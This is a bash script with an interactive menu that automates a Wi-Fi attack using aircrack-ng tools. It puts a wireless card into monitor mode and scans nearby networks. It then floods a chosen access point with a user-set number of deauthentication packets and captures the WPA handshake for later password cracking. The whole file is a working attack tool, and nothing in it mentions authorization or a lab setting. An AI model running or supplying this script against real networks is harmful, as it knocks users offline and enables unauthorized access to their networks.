#!/bin/bash

# Default wireless interface
default_wireless_interface="wlan1mon"

# Function to display the main menu
display_menu() {
    echo "Main Menu:"
    echo "1. Select wireless interface"
    echo "2. Scan for networks"
    echo "3. Display scanned networks"
    echo "4. Select a network and capture handshake"
    echo "5. Exit"
}

# Function to select a wireless interface
select_wireless_interface() {
    read -p "Enter the name of your wireless interface (or leave blank to use $default_wireless_interface): " wireless_interface_input
    wireless_interface=${wireless_interface_input:-$default_wireless_interface}
    airmon-ng start $wireless_interface
    echo "Wireless interface $wireless_interface is now in monitor mode."
}

# Function to scan for networks
scan_networks() {
    # Scan for networks and save the output to a file
    airodump-ng $wireless_interface -w scan_output --output-format csv &

    # Wait for a while to ensure networks are scanned
    sleep 10

    # Parse the output to find the BSSID and ESSID of the networks
    awk -F ',' '{if(NR>1)print $1,$14}' scan_output-01.csv | while read bssid essid; do
        echo "Found network: $essid ($bssid)"
    done
}

# Function to display scanned networks
display_scanned_networks() {
    echo "Scanned Networks:"
    awk -F ',' '{if(NR>1)print $1,$14}' scan_output-01.csv | while read bssid essid; do
        echo "Network: $essid ($bssid)"
    done
}

# Function to select a network and capture handshake
capture_handshake() {
    # Prompt the user to enter the BSSID of the network to target
    read -p "Enter the BSSID of the network you want to target: " selected_bssid

    # Prompt for the number of deauthentication packets to send
    read -p "Enter the number of deauthentication packets to send: " deauth_packets

    # Perform deauthentication attack on the selected network
    aireplay-ng --deauth $deauth_packets -a $selected_bssid $wireless_interface &

    # Capture the handshake
    airodump-ng --bssid $selected_bssid -w handshake $wireless_interface

    # Once the handshake is captured, stop the script or return to the main menu
}

# Main loop
while true; do
    display_menu
    read -p "Enter your choice: " choice
    case $choice in
        1)
            select_wireless_interface
            ;;
        2)
            scan_networks
            ;;
        3)
            display_scanned_networks
            ;;
        4)
            capture_handshake
            ;;
        5)
            echo "Exiting..."
            # Stop monitoring mode before exiting
            airmon-ng stop $wireless_interface
            exit
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac
done
